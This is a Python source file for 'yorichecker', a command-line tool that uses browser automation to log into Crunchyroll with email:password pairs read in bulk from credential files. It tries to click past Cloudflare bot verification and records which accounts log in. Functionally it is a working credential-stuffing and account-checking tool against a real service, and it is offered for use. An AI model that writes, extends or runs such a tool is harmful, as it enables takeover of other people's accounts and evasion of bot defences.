import asyncio
import argparse
import sys
import os
import time
from pathlib import Path
from playwright.async_api import async_playwright
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

HEADLESS = True

# Directory setup
HOME_DIR = Path.home()
YORICHECKER_DIR = HOME_DIR / "YORICHECKER"
RESULTS_DIR = YORICHECKER_DIR / "RESULTS"

def ensure_directories():
    """Ensure YORICHECKER and RESULTS directories exist."""
    YORICHECKER_DIR.mkdir(exist_ok=True)
    RESULTS_DIR.mkdir(exist_ok=True)
    return YORICHECKER_DIR, RESULTS_DIR

async def bypass_cloudflare(page, max_wait=120):
    start = asyncio.get_event_loop().time()
    while (asyncio.get_event_loop().time() - start) < max_wait:
        try:
            content = await page.content()
            url = page.url
            if "cloudflare" in content.lower() or "security verification" in content.lower():
                logger.info("Cloudflare detected – trying to auto‑click Verify")
                try:
                    verify_btn = await page.wait_for_selector(
                        "button:has-text('Verify'), button:has-text('I am human'), button:has-text('Verify you are human')",
                        timeout=3000
                    )
                    if verify_btn:
                        await verify_btn.click()
                        logger.info("Clicked 'Verify' button")
                        await asyncio.sleep(3)
                except:
                    logger.info("No clickable button – waiting for auto‑verification")
                    await asyncio.sleep(2)

                await asyncio.sleep(2)
                new_content = await page.content()
                new_url = page.url
                if ("cloudflare" not in new_content.lower() and
                    "security verification" not in new_content.lower()) or \
                   ("www.crunchyroll.com/" in new_url and "login" not in new_url):
                    logger.info("Cloudflare cleared")
                    return True
            else:
                logger.info("No Cloudflare detected")
                return True
        except Exception as e:
            logger.warning(f"Error in bypass_cloudflare: {e}")
            await asyncio.sleep(1)

    logger.error("Cloudflare bypass timed out")
    return False

async def login_crunchyroll(email: str, password: str) -> dict:
    result = {"success": False, "message": ""}
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=HEADLESS,
            slow_mo=50,
            args=['--incognito']
        )
        context = await browser.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            storage_state=None
        )
        page = await context.new_page()

        try:
            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
            logger.info("Navigating to SSO login")
            await page.goto(sso_url, timeout=60000)
            await page.wait_for_load_state("networkidle", timeout=30000)

            logger.info("Checking for Cloudflare")
            if not await bypass_cloudflare(page):
                result["message"] = "Cloudflare verification timed out"
                return result

            logger.info("Handling cookie consent")
            cookie_selectors = [
                "button:has-text('Accept All')",
                "button:has-text('Accept all')",
                "button[data-testid='accept-button']",
                "#onetrust-accept-btn-handler",
                ".onetrust-accept-btn-handler"
            ]
            for sel in cookie_selectors:
                try:
                    btn = await page.wait_for_selector(sel, timeout=2000)
                    if btn:
                        await btn.click()
                        logger.info(f"Clicked cookie button: {sel}")
                        await asyncio.sleep(1)
                        break
                except:
                    pass

            logger.info("Looking for email field")
            email_field = None
            email_selectors = [
                "input[name='email']",
                "input[type='email']",
                "input[name='login']",
                "input[id='email']",
                "input[placeholder*='Email']"
            ]
            for sel in email_selectors:
                try:
                    email_field = await page.wait_for_selector(sel, timeout=3000)
                    if email_field:
                        logger.info(f"Found email field: {sel}")
                        break
                except:
                    pass
            if not email_field:
                inputs = await page.query_selector_all("input[type='text'], input[type='email']")
                for inp in inputs:
                    if await inp.is_visible():
                        email_field = inp
                        break
            if not email_field:
                result["message"] = "Email field not found"
                return result
            await email_field.fill(email)
            await asyncio.sleep(1)

            logger.info("Looking for password field")
            password_field = None
            password_selectors = [
                "input[type='password']",
                "input[name='password']",
                "input[id='password']",
                "input[placeholder*='Password']"
            ]
            for sel in password_selectors:
                try:
                    password_field = await page.wait_for_selector(sel, timeout=3000)
                    if password_field:
                        logger.info(f"Found password field: {sel}")
                        break
                except:
                    pass
            if not password_field:
                pw_inputs = await page.query_selector_all("input[type='password']")
                if pw_inputs:
                    password_field = pw_inputs[0]
            if not password_field:
                result["message"] = "Password field not found"
                return result
            await password_field.fill(password)
            await asyncio.sleep(0.5)

            logger.info("Submitting login")
            submit_btn = None
            submit_selectors = [
                "button[type='submit']",
                "button:has-text('LOGIN')",
                "button:has-text('Sign In')",
                "button:has-text('NEXT')",
                "input[type='submit']"
            ]
            for sel in submit_selectors:
                try:
                    submit_btn = await page.wait_for_selector(sel, timeout=2000)
                    if submit_btn:
                        logger.info(f"Found submit button: {sel}")
                        break
                except:
                    pass
            if submit_btn:
                await submit_btn.click()
            else:
                await password_field.press("Enter")

            logger.info("Waiting for login response (up to 120s)")
            await asyncio.sleep(5)

            current_url = page.url
            if "www.crunchyroll.com/" in current_url and "login" not in current_url:
                content = await page.content()
                if "verifying" not in content.lower():
                    logger.info("Already on dashboard after submit")
                    result["success"] = True
                    result["message"] = "Login Successful!"
                    return result

            content = await page.content()
            if "cloudflare" in content.lower() or "security verification" in content.lower():
                logger.info("Cloudflare appeared after login – trying to bypass")
                if await bypass_cloudflare(page):
                    logger.info("Post‑login Cloudflare cleared")
                    await asyncio.sleep(3)
                else:
                    result["message"] = "Post‑login Cloudflare timed out"
                    return result

            try:
                await page.wait_for_load_state("networkidle", timeout=30000)
            except:
                pass

            final_url = page.url
            page_content = await page.content()

            if "incorrect" in page_content.lower() or "wrong" in page_content.lower():
                result["message"] = "Wrong email or password"
            elif "www.crunchyroll.com/" in final_url and "login" not in final_url and "verifying" not in page_content.lower():
                result["success"] = True
                result["message"] = "Login Successful!"
            elif "sso.crunchyroll.com/login" in final_url:
                result["message"] = "Login not successful – check credentials"
            else:
                result["message"] = f"Unknown state – URL: {final_url}"

        except Exception as e:
            logger.error(f"Login error: {e}")
            result["message"] = f"Error: {str(e)[:150]}"

        finally:
            await browser.close()

    return result

def process_credentials_raw(email: str, password: str) -> dict:
    """Run login coroutine and return raw result dict."""
    try:
        result = asyncio.run(login_crunchyroll(email, password))
        return result
    except Exception as e:
        return {"success": False, "message": f"Error: {str(e)}"}

def format_result(email: str, result: dict) -> str:
    """Format result for display."""
    status = "SUCCESS" if result["success"] else "FAILED"
    # Mask email for privacy in output
    masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
    return f"{masked_email}: {status} - {result['message']}"

def detect_and_parse_line(line: str):
    """Detect delimiter and parse email:password from line."""
    line = line.strip()
    if not line:
        return None, None

    # Try different delimiters in order of preference
    delimiters = [':', ' ', ';']
    for delim in delimiters:
        if delim in line:
            parts = line.split(delim, 1)
            if len(parts) == 2:
                email = parts[0].strip()
                password = parts[1].strip()
                if email and password:  # Both non-empty
                    return email, password
    return None, None

def process_file(filename: str) -> list:
    """Process a file containing email:password pairs.

    Returns list of tuples: (email, password, result_dict)
    """
    ensure_directories()
    filepath = YORICHECKER_DIR / filename

    if not filepath.exists():
        raise FileNotFoundError(f"File '{filename}' not found in {YORICHECKER_DIR}")

    results = []
    with open(filepath, 'r', encoding='utf-8') as f:
        for line_num, line in enumerate(f, 1):
            line = line.rstrip('\n\r')
            if not line.strip():
                continue

            email, password = detect_and_parse_line(line)
            if email is None or password is None:
                logger.warning(f"Skipping invalid line {line_num}: {line}")
                continue

            logger.info(f"Processing line {line_num}: {email[:3]}***@{email.split('@')[1] if '@' in email else email}")
            result = process_credentials_raw(email, password)
            results.append((email, password, result))

            # Medium speed delay: 2 seconds between accounts
            time.sleep(2)

    return results

def save_results(filename: str, results: list):
    """Save processing results to a file in RESULTS directory."""
    ensure_directories()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    safe_filename = "".join(c for c in filename if c.isalnum() or c in ('.', '_', '-')).rstrip('.')
    result_filename = f"{safe_filename}_results_{timestamp}.txt"
    result_path = RESULTS_DIR / result_filename

    with open(result_path, 'w', encoding='utf-8') as f:
        f.write(f"Crunchyroll Checker Results\n")
        f.write(f"Source file: {filename}\n")
        f.write(f"Processed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total accounts: {len(results)}\n")
        f.write("="*50 + "\n\n")

        for i, (email, password, result) in enumerate(results, 1):
            status = "SUCCESS" if result["success"] else "FAILED"
            masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else email
            f.write(f"{i}. {masked_email}: {status} - {result['message']}\n")
            if not result["success"]:
                f.write(f"   Details: {result['message']}\n")

    return result_path

def main():
    parser = argparse.ArgumentParser(
        description='Crunchyroll Login Checker - Advanced CLI Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  yorichecker init                          # Create YORICHECKER directory structure
  yorichecker check email@example.com pass  # Check single account
  yorichecker check accounts.txt            # Check accounts in YORICHECKER/accounts.txt
  yorichecker help                          # Show this help message
  yorichecker version                       # Show version information

After first run, the tool creates ~/YORICHECKER/ directory.
Place your credential files in ~/YORICHECKER/ and process them with:
  yorichecker check filename.txt

Files should contain email:password pairs (supports :, space, or ; as delimiters).
Results are saved to ~/YORICHECKER/RESULTS/ as timestamped text files.
        '''
    )

    # Add version argument that works with subparsers
    parser.add_argument('--version', action='store_true', help='Show version information')

    subparsers = parser.add_subparsers(dest='command', help='Available commands')

    # Init command
    init_parser = subparsers.add_parser('init', help='Create YORICHECKER directory structure')

    # Check command
    check_parser = subparsers.add_parser('check', help='Check Crunchyroll credentials')
    check_parser.add_argument('target', help='Email address or filename (must be in YORICHECKER/ folder)')
    check_parser.add_argument('--password', help='Password for email mode (required when target is an email)')
    check_parser.add_argument('--no-headless', action='store_false', dest='headless',
                              help='Run browser with UI (default: headless)')

    # Help command (argparse adds this automatically, but we can customize)
    help_parser = subparsers.add_parser('help', help='Show help message')

    args = parser.parse_args()

    global HEADLESS
    if hasattr(args, 'headless'):
        HEADLESS = args.headless

    # Handle version flag
    if args.version:
        print("yorichecker 0.1.0")
        return

    # Handle commands
    if args.command == 'init':
        ensure_directories()
        print(f"[+] Created YORICHECKER directory structure:")
        print(f"    [DIR] {YORICHECKER_DIR}")
        print(f"    [DIR] {RESULTS_DIR}")
        print(f"\nPlace your credential files in {YORICHECKER_DIR}")
        print(f"Process them with: yorichecker check <filename>")
        return

    elif args.command == 'help':
        parser.print_help()
        return

    elif args.command == 'check':
        ensure_directories()

        # Determine if target is email or filename
        if '@' in args.target and not args.target.endswith('.txt'):
            # Email mode
            if not args.password:
                parser.error("--password is required when checking an email address")

            print(f"[+] Checking single account: {args.target[:3]}***@{args.target.split('@')[1]}")
            print("Please wait 30-40 seconds...")

            result = process_credentials_raw(args.target, args.password)
            formatted = format_result(args.target, result)
            print(f"\n{formatted}")

            # Also save single result to RESULTS
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_email = "".join(c for c in args.target if c.isalnum() or c in ('@', '.', '_', '-')).replace('@', '_at_')
            result_filename = RESULTS_DIR / f"single_{safe_email}_{timestamp}.txt"
            with open(result_filename, 'w') as f:
                f.write(f"Single Account Check\n")
                f.write(f"Email: {args.target}\n")
                f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Result: {formatted}\n")
            print(f"[+] Result saved to: {result_filename}")

            sys.exit(0 if result["success"] else 1)

        else:
            # File mode
            filename = args.target
            # Ensure it's just a filename, not a path
            if '/' in filename or '\\' in filename:
                parser.error("Please provide only the filename (must be located in YORICHECKER/ folder)")

            print(f"[+] Processing file: {filename}")
            print(f"[+] Looking in: {YORICHECKER_DIR}")

            try:
                results = process_file(filename)

                if not results:
                    print("[-] No valid accounts found in file.")
                    sys.exit(1)

                success_count = sum(1 for _, _, r in results if r["success"])
                print(f"\n[+] Processing complete: {success_count}/{len(results)} successful logins")

                # Save results
                result_path = save_results(filename, results)
                print(f"[+] Detailed results saved to: {result_path}")
                print(f"[+] Results directory: {RESULTS_DIR}")

                sys.exit(0 if success_count > 0 else 1)

            except FileNotFoundError as e:
                print(f"[-] {e}")
                print(f"[i] Place your file in {YORICHECKER_DIR} or run 'yorichecker init' to create directories")
                sys.exit(1)
            except Exception as e:
                print(f"[-] Error processing file: {e}")
                sys.exit(1)

    else:
        # No command given - show help or enter interactive mode?
        # For now, show help
        parser.print_help()
        print("\n[i] Tip: Run 'yorichecker init' first to set up directories")


if __name__ == "__main__":
    main()